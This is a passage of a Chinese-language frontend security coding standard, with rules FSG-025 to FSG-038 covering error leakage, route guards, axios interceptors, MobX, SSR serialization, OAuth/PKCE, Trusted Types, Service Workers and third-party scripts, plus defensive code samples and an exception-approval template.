- 前端处理 WebSocket 消息时不使用 `eval`、`innerHTML` 或其他不安全的方式处理消息内容。
- 设置心跳和重连退避策略，防止异常时的连接风暴。
- 组件卸载时关闭 WebSocket 连接，防止资源泄漏。

## FSG-025 错误信息与调试数据泄露

**禁止**

- 在生产环境的错误提示中展示后端返回的堆栈、SQL、内部路径、类名或配置信息。
- 在前端错误边界（Error Boundary）的 fallback UI 中展示技术细节。
- 将可能包含请求配置、Authorization、Cookie、响应体或个人信息的完整错误对象输出到控制台或遥测。
- 在 API 错误处理中将后端返回的原始错误信息直接展示给用户。

**必须**

- 生产环境使用通用的用户友好错误消息：

```jsx
function ErrorFallback({ error, resetErrorBoundary }) {
  // 生产环境不展示 error.message
  return (
    <div>
      <p>Something went wrong. Please try again.</p>
      <button onClick={resetErrorBoundary}>Retry</button>
    </div>
  );
}
```

- 错误信息中的关联 ID（traceId/correlationId）可用于用户报障后端排查。
- 结构化错误上报必须先做字段允许列表、凭据清除和采样；是否保留普通 `console.error`/`console.warn` 由数据分级决定。
- API 错误响应处理做字段过滤，仅展示用户可理解的错误消息。
- Source Map 发布遵循 FSG-023：不得含秘密；公开与否必须是明确风险决策。

## FSG-026 React Router 安全

**禁止**

- 路由守卫仅在前端判断权限，后端不验证。
- 在路由参数、search 或 hash 中传递 Token、会话 ID、密码、重置凭据或其他秘密；普通对象 ID 不应被当作秘密，必须由后端做对象级授权。
- 动态路由参数（`:id`）直接用于 API 请求，不做格式和范围校验。

**必须**

- 路由守卫（`<ProtectedRoute>` / `beforeEach`）仅作为 UX 层，后端独立验证授权。
- 路由参数做格式校验（如 UUID 格式、数字范围）。
- 嵌套路由可以重复前端权限判断改善 UX，但每个 API/RPC 操作仍由服务端独立检查主体、动作、对象和租户：

```jsx
function ProtectedRoute({ children, requiredPermission }) {
  const { hasPermission } = useAuth();
  if (!hasPermission(requiredPermission)) {
    return <Navigate to="/403" replace />;
  }
  return children;
}

<Routes>
  <Route path="/admin" element={<ProtectedRoute requiredPermission="admin:access"><AdminLayout /></ProtectedRoute>}>
    <Route path="users" element={<ProtectedRoute requiredPermission="admin:users"><UserManagement /></ProtectedRoute>} />
    <Route path="audit" element={<ProtectedRoute requiredPermission="admin:audit"><AuditLog /></ProtectedRoute>} />
  </Route>
</Routes>
```

- 使用 `useParams` 获取的路由参数在用于 API 请求前做校验。
- 对对象不存在与无权限是否使用相同响应，根据枚举风险和产品反馈要求决定；服务端响应不得泄露未授权对象详情。

## FSG-027 axios 拦截器安全

**禁止**

- 在 axios 请求拦截器中暴露完整的请求体到日志。
- 在响应拦截器中将后端返回的敏感字段（如 Token、内部 ID）存储到 localStorage。
- 拦截器中的错误处理向后端重发包含凭据的请求。
- 在拦截器中使用 `eval` 或 `new Function` 处理响应数据。

**必须**

- 认证头只添加到精确允许的 API Origin；Cookie 认证由浏览器自动携带，不从 `HttpOnly` Cookie 读取 Bearer Token：

```js
const API_ORIGIN = new URL('/api/', window.location.origin).origin;

instance.interceptors.request.use((config) => {
  const target = new URL(config.url || '', config.baseURL || window.location.origin);
  const token = getInMemoryAccessToken();
  if (target.origin === API_ORIGIN && token) {
    config.headers.Authorization = `Bearer ${token}`;
  } else if (target.origin !== API_ORIGIN) {
    delete config.headers.Authorization;
    config.withCredentials = false;
  }
  return config;
});
```

- 响应拦截器中做错误统一处理，不暴露技术细节：

```js
instance.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      // 跳转登录，不存储当前 URL 中的敏感参数
      redirectToLogin();
    }
    // 不将 error.response.data 的完整内容暴露给 UI
    return Promise.reject({
      code: error.response?.status || 'NETWORK_ERROR',
      message: getSafeErrorMessage(error),
    });
  }
);
```

- 401 拦截中使用 Refresh Token 刷新时，确保并发请求不触发多次刷新（使用请求队列或互斥锁）。
- `baseURL`、请求 `url` 和重定向目标不可由不可信输入控制；启用 axios 对绝对 URL 的限制能力时，仍需独立校验最终 Origin。
- 只对明确幂等操作自动重试；状态变更需要幂等键或业务确认，禁止拦截器盲目重放。
- 配置全局超时：

```js
instance.defaults.timeout = 30000;
```

## FSG-028 MobX 状态安全

**禁止**

- 在 MobX store 中存储密码、Refresh Token、密钥或其他长期敏感凭据。
- 使用 `@observable` 对包含敏感字段的对象做深度观测。
- 在 `mobx-react` 的 `observer` 组件中直接渲染未经脱敏的敏感字段。
- 使用 `mobx-persist` 持久化敏感数据到 localStorage。
- 在 MobX 的 `autorun`/`reaction` 中执行不安全的操作（如 `eval`、`innerHTML`）。

**必须**

- MobX store 不持久化敏感数据；敏感操作通过受控 API 调用完成。确需短期 Access Token 时遵守 FSG-016 的内存、最小权限和 DevTools 限制。
- 使用 `@observable.ref` 或 `@observable.shallow` 避免对复杂对象的深度观测：

```js
class DataStore {
  @observable.ref largeDataset = null; // 不深度观测
  @observable.shallow items = []; // 浅观测
}
```

- 对从 API 获取的数据做字段过滤后再存入 store。
- 生产构建中不启用 MobX DevTools。
- `mobx-persist` 配置中明确排除敏感字段。
- 组件渲染敏感字段时做脱敏（如 `maskIdNumber(idNumber)`）。

## FSG-029 Promise 错误处理安全

**禁止**

- 在 `.catch()` 中将原始错误信息直接展示给用户。
- 在 Promise 错误处理中重试包含敏感数据的请求且无次数限制。
- Promise 链中使用 `.then()` 中的 `eval` 或 `Function` 处理响应。
- 启动安全敏感副作用后丢弃 Promise，导致授权失败、签名失败、审计失败或取消信号无法传播。

**必须**

- 在调用边界处理可能影响授权、支付、保存、上传、审计或凭据刷新的拒绝；Promise 可以返回给上层统一处理，不要求每层重复 `.catch()`：

```jsx
async function fetchData() {
  try {
    const response = await api.get('/data');
    return response.data;
  } catch (error) {
    reportSafeError(toTelemetryFields(error));
    throw new SafeError('Failed to load data');
  }
}
```

- 全局 `unhandledrejection` 仅作最后告警和遥测，不是业务错误处理或安全控制；遥测先脱敏，不要求无条件 `preventDefault()`：

```js
window.addEventListener('unhandledrejection', (event) => {
  reportSafeError(toTelemetryFields(event.reason));
});
```

- 错误处理中重试请求时限制次数并使用退避、抖动和取消信号；非幂等操作不得自动重放。
- 敏感数据请求失败后从内存中清除相关数据。

## FSG-030 SSR 水合与初始状态安全

**禁止**

- SSR 初始状态（`window.__INITIAL_STATE__`）中包含敏感数据（Token、密码、密钥）。
- 初始状态 JSON 序列化时未防御 `</script>` 注入（可终止 `<script>` 标签并注入恶意 HTML）。
- SSR 渲染的 HTML 中包含用户可控的未编码内容。
- SSR 应用不区分服务端和客户端的环境变量，将服务端密钥泄露到客户端。

**必须**

- SSR 初始状态序列化时转义危险字符：

```js
function serializeState(state) {
  return JSON.stringify(state)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}
// 更优：<script type="application/json" id="initial-state">...</script>
```

- 初始状态中不包含敏感数据，敏感数据在客户端水合后通过受认证的 API 获取。
- 优先使用框架维护的安全序列化能力，或放入 `application/json` 数据块后使用 `textContent` + `JSON.parse()`；不得把普通 `JSON.stringify()` 结果直接拼入可执行脚本上下文。
- SSR 应用中 `process.env` 的使用区分服务端和客户端，使用 `import.meta.env.SSR` 或 `typeof window` 做条件判断。
- SSR 渲染的 HTML 对用户可控内容使用框架的自动转义（React `{}` / Vue `{{ }}`）。
- SSR 的 CSP 与 CSR 的 CSP 配置一致，nonce 在每次请求时生成。

## FSG-031 OAuth、OIDC 与 SSO 浏览器流程

本规则为发布硬门禁。SPA 使用 Implicit Grant、未校验 PKCE/`state`/`nonce`，或把 Token 放入前端 URL，结论必须为 `BLOCK`。

**禁止**

- 使用 `response_type=token`、OAuth Implicit Grant 或从 URL fragment 读取 Access Token。
- 使用固定、可预测、跨事务复用或未与浏览器会话绑定的 `state`、`nonce`、PKCE verifier。
- 接受任意 `redirect_uri`、登录后回跳地址或未知 issuer；仅比较域名字符串或前缀不够。
- 在前端 bundle 中保存 OAuth Client Secret；浏览器 SPA 是 public client，不能保密 Client Secret。

**必须**

- 使用 Authorization Code + PKCE，`code_challenge_method=S256`；每次授权事务生成高熵 verifier、`state`，OIDC 同时生成 `nonce`。
- 精确校验回调路径、`state`、issuer；验证 ID Token 的签名、issuer、audience、nonce 和时效。授权码只能由发起事务的客户端兑换一次。
- verifier 和事务状态只短期保存在当前授权事务需要的最小范围；回调完成后清理 URL、事务状态和临时数据。
- 优先采用 BFF，让服务端完成 Token 兑换、Refresh Token 保管与 API 代理。纯 SPA 必须记录 Token 生命周期、存储、撤销和 XSS 风险。
- 为错误 `state`、错误 issuer、错误/缺失 PKCE、重放授权码、开放回跳和 Token URL 泄露编写负面测试。

## FSG-032 Trusted Types 与 DOM sink 治理

**禁止**

- 创建返回原始字符串的宽松 default policy，仅为绕过 `require-trusted-types-for 'script'`。
- 让业务组件各自创建 Trusted Types policy，或让不可信输入选择 policy 名称、清洗配置和允许标签。
- 把 Trusted Types 当成 HTML 清洗、上下文编码或 CSP 的替代品。

**必须**

- 先以 Report-Only 盘点 `innerHTML`、`outerHTML`、`insertAdjacentHTML`、`document.write`、脚本 URL 等 sink，再启用 `require-trusted-types-for 'script'`。
- 只允许少量命名、集中、可审计 policy；HTML policy 调用维护中的清洗器并使用业务允许列表。
- React 的 `dangerouslySetInnerHTML` 和 Vue 的 `v-html` 统一经过受控封装，不允许组件绕过 policy。
- CSP 同时限制 `trusted-types` 可创建的 policy 名称；不兼容浏览器仍依赖框架转义、清洗和安全 DOM API。
- 对 policy 绕过、清洗后再拼接和非 TrustedHTML 写 sink 编写负面测试。

## FSG-033 DOM Clobbering 与命名属性

**禁止**

- 依赖 `window.someName`、`document.someName`、`form.someName` 等命名属性获取安全配置、URL、Token 或函数。
- 让不可信 HTML 控制关键 `id`/`name`，再使用同名全局变量或 `document.forms` 命名访问。
- 使用 `obj[key]` 从全局对象、DOM 节点或配置对象读取不可信键且无允许列表。

**必须**

- 使用词法变量、模块导入、`getElementById`/`querySelector`，并校验得到的节点类型、来源和预期容器。
- 富文本/HTML 清洗时开启命名属性防护或前缀化能力（例如 DOMPurify `SANITIZE_NAMED_PROPS`），并禁止关键 `id`/`name`。
- 安全配置放在不可被 DOM 覆盖的模块作用域或冻结对象中；用户键使用 `Map` 或无原型对象。
- 测试重复 `id`、`name=location`、`name=action`、表单集合覆盖和嵌套命名元素等安全负例。

## FSG-034 Service Worker 与浏览器缓存

**禁止**

- 从不可信 URL、配置或消息调用 `importScripts()`、动态 `import()` 或注册任意 Service Worker。
- Service Worker 缓存含 Token、Cookie、一次性下载地址、个人敏感数据或标记 `Cache-Control: no-store` 的响应。
- 使用仅由 URL 决定的缓存键保存按用户、租户、权限或请求头变化的响应。
- 对跨域 opaque response、不成功响应或重定向响应无条件 `cache.put()`。

**必须**

- Worker 脚本、scope 和更新 URL 固定为同源受控路径；CSP 设置精确 `worker-src`，构建产物可追溯并支持快速失效。
- 缓存前校验请求方法、最终 URL、Origin、响应状态、响应类型、内容类型、大小和业务缓存策略。
- 登录用户数据默认网络优先或不缓存；确需离线缓存时按用户/租户隔离并在注销、切换租户、撤权和版本升级时清除。
- 版本化 Cache Storage；`activate` 只删除明确属于本应用的旧版本，不清空其他应用缓存。
- 对旧 Worker 接管、离线越权数据、注销后缓存、跨租户缓存和恶意消息编写测试。

## FSG-035 axios/fetch 请求目标与凭据边界

本规则为发布硬门禁。Authorization、Cookie、CSRF Token 或签名被发送到未批准 Origin，结论必须为 `BLOCK`。

**禁止**

- 让 URL 参数、API 响应、`postMessage`、localStorage 或远程配置直接控制 axios `baseURL`、fetch URL、代理目标或下载地址。
- 对任意 Origin 设置 axios `withCredentials=true` 或 fetch `credentials: 'include'`。
- 请求重试、刷新 Token 或重定向后不重新校验最终 Origin。
- 只用 `startsWith`、字符串包含或可混淆的 host 后缀判断可信 URL。

**必须**

- 用 `new URL()` 规范化最终 URL，分别校验 `protocol`、`origin`、必要路径前缀；凭据只发往精确允许的 Origin。
- 跨 Origin 前删除 `Authorization`、CSRF、自定义签名和敏感追踪头，并关闭自动 Cookie；服务端 CORS 仍需精确配置。
- axios 配置总超时和取消；fetch 使用 `AbortController`。响应在进入 React/Vue/MobX 状态前校验状态、Content-Type、schema 和业务大小上限。
- API client 按信任域拆分实例，避免一个全局拦截器把内部凭据添加到第三方请求。
- 测试协议相对 URL、userinfo、混淆子域、端口变化、绝对 URL 覆盖 `baseURL`、跨 Origin 重定向和凭据剥离。

## FSG-036 客户端资源耗尽与 ReDoS

**禁止**

- 对不可信长字符串执行灾难性回溯正则、无界递归、深拷贝、深合并、JSON 展开、Markdown/语法高亮或复杂 CSS 选择器查询。
- 使用无界 `Promise.all`、定时器、事件监听器、WebSocket 重连、MobX `autorun/reaction` 或 React effect 处理外部规模数据。
- 让 URL/API 数据直接控制循环次数、DOM 节点数、并发数、分页大小、Canvas 尺寸或内存缓存。

**必须**

- 对输入字节、字符串长度、数组项、对象深度、DOM 数量、并发、重试、缓存和处理时间设硬上限；服务端同步执行更严格上限。
- 使用线性时间正则或安全解析器；无法证明复杂度时放弃正则或施加短输入上限并测试最坏输入。
- 大列表分页或虚拟化；异步任务使用有界并发、取消信号和组件卸载清理。
- CPU 密集任务可移入 Worker 改善主线程可用性，但 Worker 不是不可信代码沙箱，仍需输入和资源限制。
- 为最大允许输入、超限拒绝、快速路由切换、重复挂载、离线重连和最坏正则输入编写性能安全测试。

## FSG-037 下载、导出与 Blob URL

**禁止**

- 把不可信值直接写入 CSV/表格公式单元格，导致以 `=`, `+`, `-`, `@` 等公式前缀执行。
- 使用不可信 HTML、SVG 或活动内容创建 Blob URL 后在同源页面直接打开。
- 长期保留 Blob URL、包含敏感数据的对象 URL 或可预测下载链接。
- 仅靠前端文件名、扩展名或 `download` 属性决定安全内容类型。

**必须**

- CSV/表格导出使用经过验证的库和公式注入防护；按目标办公软件验证转义策略，服务端导出也执行同样控制。
- Blob 创建前限制内容类型和大小；不可信活动内容强制下载或在隔离 Origin/严格 sandbox 中预览。
- 下载完成、组件卸载或超时后调用 `URL.revokeObjectURL()`；敏感下载使用短期、单次、授权绑定地址。
- 服务端设置可信 `Content-Type`、`Content-Disposition`、`nosniff`、授权和缓存策略；前端显示文件名时按纯文本处理。
- 测试 CSV 公式前缀、CR/LF 文件名、HTML/SVG Blob、超大 Blob、撤权后重放和对象 URL 释放。

## FSG-038 第三方脚本、组件与数据边界

**禁止**

- 允许第三方脚本、Tag Manager、自定义 HTML 标签或远程组件读取完整 DOM、URL 参数、Token、表单内容或全局 MobX 状态。
- 把第三方脚本的域名允许列表、供应商信誉或合同当作脚本内容完整性证明。
- 在同源主页面执行无需 DOM 权限的分析脚本，或给 iframe 同时授予不必要的 `allow-scripts`、`allow-same-origin`、表单、弹窗和导航能力。

**必须**

- 优先由第一方代码构造字段允许列表 data layer，只向第三方发送完成目的所需的最小数据；不得含凭据、敏感输入或未授权标识。
- 优先服务端转发分析事件或在独立 Origin 的 sandbox iframe 隔离第三方 UI；`postMessage` 遵守 FSG-010。
- 固定版本和内容，优先自托管；远程脚本使用 HTTPS、SRI、CSP 和变更监控。Tag Manager 关闭任意自定义脚本，配置变更需要权限、审批和审计。
- 使用 Permissions Policy、iframe `allow`、`sandbox`、Referrer-Policy 和 CSP 最小化摄像头、麦克风、定位、剪贴板、弹窗及导航权限。
- 对供应商故障、脚本内容变化、越权字段读取、同意撤回、iframe 逃逸和消息伪造编写验证。

## 例外审批模板

```text
规则 ID：
业务能力与负责人：
精确代码/端点/环境范围：
不能采用安全替代方案的原因：
威胁模型与最大影响：
允许列表及最小权限隔离：
大小/次数/超时/并发限制：
安全测试与结果：
监控、审计与告警：
安全批准人：
到期日：
修复跟踪项：
```

## 基线来源

- [OWASP Top 10:2025](https://owasp.org/Top10/2025/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [OWASP Third-Party JavaScript Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html)
- [OWASP DOM Clobbering Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html)
- [OWASP OAuth2 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html)
- [OAuth 2.0 Security Best Current Practice, RFC 9700](https://datatracker.ietf.org/doc/html/rfc9700)
- [React Security Documentation](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- [Vue.js Security Guide](https://vuejs.org/guide/best-practices/security.html)
- [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)
- [MDN Service Worker API](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API)
- [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/)
- [OWASP Application Security Verification Standard 5.0.0](https://owasp.org/www-project-application-security-verification-standard/)
